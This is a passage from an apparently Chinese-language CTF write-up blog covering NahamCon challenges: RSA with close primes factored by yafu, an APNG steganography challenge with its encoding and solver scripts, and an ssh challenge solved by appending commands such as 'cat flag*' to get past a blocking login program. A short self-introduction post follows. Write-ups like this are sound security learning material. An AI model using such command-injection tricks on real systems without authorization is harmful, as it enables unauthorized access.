class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 3: |<br> ---------<br> q = p + 2<br>while !(isPrime(q)):<br>    q += 2<br>n = p*q<br>n = 88881615737488301225985044439881905195398292505026841973979114989583620386889966196936383863573165224625895278832099461610638739494998960540693208136536764698022077924393297727577553457866191347931512435919295847354039191586621873435195696477610004925566087150861042148930517495281441139741545346918379251933<br>e = 65537<br>ct = 20631059905657990621121472678172311137355898932087354262172309893885321498925560019065033573185005618575156342764326342253251212781095718707971251014407982342185739678572043698218123534431914415817339019215948120246829763194761668345794978860628612447418680047622373133912651452245133307912003452486642093319<br>What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>这里给出了两个素数生成的方法。可以看到这两个素数应该是比较接近的。</p><p>所以直接用yafu尝试进行分解。yafu比较适合这种情况。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">fac: factoring 88881615737488301225985044439881905195398292505026841973979114989583620386889966196936383863573165224625895278832099461610638739494998960540693208136536764698022077924393297727577553457866191347931512435919295847354039191586621873435195696477610004925566087150861042148930517495281441139741545346918379251933<br>fac: using pretesting plan: normal<br>fac: no tune info: using qs/gnfs crossover of 95 digits<br>div: primes less than 10000<br>fmt: 1000000 iterations<br>Total factoring time = 0.6750 seconds<br><br><br>***factors found***<br><br>P154 = 9427704690829486372323834254401690991535897190805758825455941539744129948703411885292076952568876153202122275131143524310245302189466786096848123870588379<br>P154 = 9427704690829486372323834254401690991535897190805758825455941539744129948703411885292076952568876153202122275131143524310245302189466786096848123870588327<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>可以看到很快就出答案了。这样p和q就分解出来了。后面就是单纯的rsa运算了。</p><p>后面还做了一道隐写</p><h1 id="ostrich"><a class="markdownIt-Anchor" href="#ostrich"></a> Ostrich</h1><p>一共给了三个文件。</p><p>一张图片，一个算法，一个结果。</p><p>应该对算法进行逆向就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> imageio<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, GifImagePlugin<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> l2b, bytes_to_long <span class="hljs-keyword">as</span> b2l<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><br>filenames = []<br>flag = <span class="hljs-string">&quot;REDACTED&quot;</span> <br><br>orig_filename = <span class="hljs-string">&quot;ostrich.jpg&quot;</span><br>orig_image = Image.<span class="hljs-built_in">open</span>(orig_filename)<br>pixels = orig_image.load()<br>width, height = orig_image.size<br>images = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    new_filename = <span class="hljs-string">f&#x27;./images/ostrich<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span><br>    new_image = Image.new(orig_image.mode, orig_image.size)<br>    new_pixels = new_image.load()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            new_pixels[x,y] = orig_image.getpixel((x, y))<br><br>    x = random.randrange(<span class="hljs-number">0</span>,width)<br>    y = random.randrange(<span class="hljs-number">0</span>,height)<br>    pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((x, y)))<br>    <span class="hljs-keyword">while</span>(pixel[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>):<br>        x = random.randrange(<span class="hljs-number">0</span>,width)<br>        y = random.randrange(<span class="hljs-number">0</span>,height)<br>        pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((random.randrange(<span class="hljs-number">0</span>,width), random.randrange(<span class="hljs-number">0</span>,height))))<br>    <br>    new_val = l2b(pixel[<span class="hljs-number">2</span>]*<span class="hljs-built_in">ord</span>(flag[i]))<br>    pixel[<span class="hljs-number">0</span>] = new_val[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(new_val) &gt; <span class="hljs-number">1</span>:<br>        pixel[<span class="hljs-number">1</span>] = new_val[<span class="hljs-number">1</span>]<br>    pixel[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br><br>    new_pixels[x, y] = (pixel[<span class="hljs-number">0</span>], pixel[<span class="hljs-number">1</span>], pixel[<span class="hljs-number">2</span>])<br>    new_image.save(new_filename)<br>    filenames.append(new_filename)<br>    images.append(new_image)<br><br>APNG.from_files(filenames, delay=<span class="hljs-number">0</span>).save(<span class="hljs-string">&quot;result.apng&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>最后保存的是一个APNG文件，这是个动图文件，但这里不会动就是了。</p><p>大致流程先看了一遍。我们先把文件提出来，这里的APNG动图也是多幅图片在一起构成的。每张图片里面嵌入了一个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> PIL<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><br>img = APNG.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;result.apng&quot;</span>)<br><br><span class="hljs-keyword">for</span> i, (png, control) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(img.frames):<br>    png.save(<span class="hljs-string">&quot;./extract/&#123;i&#125;.png&quot;</span>.<span class="hljs-built_in">format</span>(i=i))<br></code></pre></td></tr></table></figure><p>一共提取了38张图片。</p><p>来讲一下嵌入的流程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">x = random.randrange(<span class="hljs-number">0</span>, width)<br>y = random.randrange(<span class="hljs-number">0</span>, height)<br>pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((x, y)))<br><span class="hljs-keyword">while</span> (pixel[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>):<br>    x = random.randrange(<span class="hljs-number">0</span>, width)<br>    y = random.randrange(<span class="hljs-number">0</span>, height)<br>    pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((random.randrange(<span class="hljs-number">0</span>, width), random.randrange(<span class="hljs-number">0</span>, height))))<br></code></pre></td></tr></table></figure><p>最主要的部分在这里。</p><p>这里要找一个B通道值不为0的点。原始图像中找一个B通道不为0的点，基本上所有的点都不可能B通道为0，所以其实就是随机的在里面找一个点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">new_val = l2b(pixel[<span class="hljs-number">2</span>] * <span class="hljs-built_in">ord</span>(flag[i]))<br> pixel[<span class="hljs-number">0</span>] = new_val[<span class="hljs-number">0</span>]<br> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(new_val) &gt; <span class="hljs-number">1</span>:<br>     pixel[<span class="hljs-number">1</span>] = new_val[<span class="hljs-number">1</span>]<br> pixel[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>在这里面，又把我们的值改成了0。这就让这个点很好找了。。</p><p>所以我们只需要找到这个点，读取这个点的像素值，然后和原始图像的这个点做运算就可以得到flag。</p><p>只要和原图比较多了哪一个b通道值为0 的点就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, GifImagePlugin<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> l2b, bytes_to_long <span class="hljs-keyword">as</span> b2l<br><br>origin = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;ostrich.jpg&quot;</span>)<br>zero_dot = []<br>width, height = origin.size<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">if</span> origin.getpixel((x,y))[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>            zero_dot.append((x,y))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):<br>    current_img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./extract/<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>    width, height = current_img.size<br>    image = Image.new(current_img.mode, current_img.size)<br>    pixels = image.load()<br>    change_dot = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">if</span> change_dot <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            pixels[x, y] = current_img.getpixel((x, y))<br>            <span class="hljs-keyword">if</span> pixels[x,y][<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (x,y) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> zero_dot:<br>                    <span class="hljs-comment"># print(f&quot;&#123;i&#125; :&quot;,(x,y), &quot;is the change point&quot;)</span><br>                    change_dot = (x,y)<br><br>    origin_blue = origin.getpixel(change_dot)[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-comment"># 基本上都会出现两个字节长度</span><br>    value = <span class="hljs-built_in">bytes</span>([current_img.getpixel(change_dot)[<span class="hljs-number">0</span>],current_img.getpixel(change_dot)[<span class="hljs-number">1</span>]])<br>    value = b2l(value)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(value//origin_blue), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>以下是后面添加的。（2022/05/03）</p><h1 id="steam-locomotive"><a class="markdownIt-Anchor" href="#steam-locomotive"></a> Steam Locomotive</h1><p>这题很好玩。</p><p>用ssh链接目标服务器之后。执行的是SL这个命令，而且此时我们会被阻塞无法操作。</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><br><br>                      (  ) (@<span class="hljs-meta">@)</span> ( )  (<span class="hljs-meta">@)</span>  ()    @@    O     @     O     @      O<br>                 (@@<span class="hljs-meta">@)</span><br>             (    )<br>          (@@@<span class="hljs-meta">@)</span><br><br>        (   )<br>      ====        ________                ___________<br>  _D _|<span class="hljs-string">  </span>|<span class="hljs-string">_______/        \__I_I_____===__</span>|<span class="hljs-string">_________</span>|<br>   |<span class="hljs-string">(_)---  </span>|<span class="hljs-string">   H\________/ </span>|<span class="hljs-string">   </span>|<span class="hljs-string">        =</span>|<span class="hljs-string">___ ___</span>|<span class="hljs-string">      _________________</span><br><span class="hljs-string">   /     </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   H  </span>|<span class="hljs-string">  </span>|<span class="hljs-string">     </span>|<span class="hljs-string">   </span>|<span class="hljs-string">         </span>||<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>||<span class="hljs-string">     _</span>|<span class="hljs-string">                \_____A</span><br><span class="hljs-string">  </span>|<span class="hljs-string">      </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   H  </span>|<span class="hljs-string">__--------------------</span>|<span class="hljs-string"> [___] </span>|<span class="hljs-string">   =</span>|<span class="hljs-string">                        </span>|<br>  |<span class="hljs-string"> ________</span>|<span class="hljs-string">___H__/__</span>|<span class="hljs-string">_____/[][]~\_______</span>|<span class="hljs-string">       </span>|<span class="hljs-string">   -</span>|<span class="hljs-string">                        </span>|<br>  |<span class="hljs-string">/ </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-----------I_____I [][] []  D   </span>|<span class="hljs-string">=======</span>|<span class="hljs-string">____</span>|<span class="hljs-string">________________________</span>|_<br>__/ =|<span class="hljs-string"> o </span>|<span class="hljs-string">=-~~\  /~~\  /~~\  /~~\ ____Y___________</span>|<span class="hljs-string">__</span>|<span class="hljs-string">__________________________</span>|_<br> |<span class="hljs-string">/-=</span>|<span class="hljs-string">___</span>|<span class="hljs-string">=O=====O=====O=====O   </span>|<span class="hljs-string">_____/~\___/          </span>|<span class="hljs-string">_D__D__D_</span>|<span class="hljs-string">  </span>|<span class="hljs-string">_D__D__D_</span>|<br>  \_/      \__/  \__/  \__/  \__/      \_/               \_/   \_/    \_/   \_/<br><br><br><br></code></pre></td></tr></table></figure><p>火车跑完，连接也断开了。这是一道简单题，但是我真的不会做。后面看别人的writeup才知道。原来ssh连接可以直接带命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\lanpesk&gt;ssh <span class="hljs-literal">-p</span> <span class="hljs-number">31404</span> user@challenge.nahamcon.com <span class="hljs-built_in">ls</span><br>user@challenge.nahamcon.com<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">flag.txt</span><br></code></pre></td></tr></table></figure><p>这里我们连接的时候直接带上一个ls命令。结果我们可以看到有个flag文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\lanpesk&gt;ssh <span class="hljs-literal">-p</span> <span class="hljs-number">31404</span> user@challenge.nahamcon.com <span class="hljs-built_in">cat</span> flag*<br>user@challenge.nahamcon.com<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">flag&#123;4f9b10a81141c7a07a494c28bd91d05b&#125;</span><br></code></pre></td></tr></table></figure><p>这样我们就能在ssh阻塞的情况下执行其他命令。算是学到了一些小知识。我觉得可以出在我们学校的新生赛里面嘿嘿。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/04/28/hello-world/"/>
    <url>/2022/04/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to my blog! This post I will introduce myself.</p><span id="more"></span><h2 id="who-am-i"><a class="markdownIt-Anchor" href="#who-am-i"></a> Who am I</h2><p>大学生一枚。计算机相关专业。如果有什么问题想和我讨论的话，请到github找我或者通过以下邮箱联系：</p><p><a href="mailto:professornameshou@gmail.com">professornameshou@gmail.com</a></p><h2 id="what-do-i-like"><a class="markdownIt-Anchor" href="#what-do-i-like"></a> What do I like</h2><p>当然是代码咯。还有各种有趣的项目。想做的事情那可真是太多了，但有时间我都会一一来做的。还有各种有趣的比赛，当然CTF也是其中之一。</p><p>以上就是我的自述啦。有什么问题还请邮件联系！希望我的博客能够帮助到你。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
